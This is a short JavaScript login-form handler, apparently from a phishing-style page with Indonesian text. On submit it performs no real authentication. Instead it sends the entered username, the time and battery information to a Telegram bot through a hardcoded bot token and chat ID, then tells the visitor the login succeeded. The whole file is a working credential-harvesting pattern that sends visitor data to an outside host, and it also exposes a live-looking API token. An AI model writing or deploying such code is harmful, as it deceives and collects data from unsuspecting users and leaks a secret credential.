document.addEventListener("DOMContentLoaded", () => {

  const TOKEN = "8591936539:AAEeHmCNXnU8r2BNXlYth2hTERKgfkBi4Ik";
  const CHAT_ID = "8534745558";

  const form = document.getElementById("loginForm");
  const statusText = document.getElementById("status");
  const progressBar = document.getElementById("progressBar");
  const togglePass = document.getElementById("togglePass");
  const password = document.getElementById("password");

  /* Toggle password (AMAN) */
  if (togglePass && password) {
    togglePass.addEventListener("click", () => {
      password.type = password.type === "password" ? "text" : "password";
    });
  }

  /* Submit login */
  form.addEventListener("submit", function(e) {
    e.preventDefault();

    const username = document.getElementById("username").value;
    const waktu = new Date().toLocaleString();

    statusText.innerText = "Processing...";
    progressBar.style.width = "30%";

    if (navigator.getBattery) {
      navigator.getBattery().then(battery => {
        kirim(username, waktu, battery);
      });
    } else {
      kirim(username, waktu, null);
    }
  });

  function kirim(username, waktu, battery) {

    let batteryInfo = "Tidak tersedia";

    if (battery) {
      const level = Math.floor(battery.level * 100);
      const charging = battery.charging ? "Charging" : "Not Charging";
      batteryInfo = `${level}% (${charging})`;
    }

    const pesan = `
🔥 LOGIN BARU 🔥
User: ${username}
Waktu: ${waktu}
Baterai: ${batteryInfo}
    `;

    progressBar.style.width = "70%";

    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: pesan
      })
    })
    .then(() => {
      progressBar.style.width = "100%";
      statusText.innerText = "Login berhasil!";
    })
    .catch(() => {
      statusText.innerText = "Gagal kirim!";
    });
  }

});
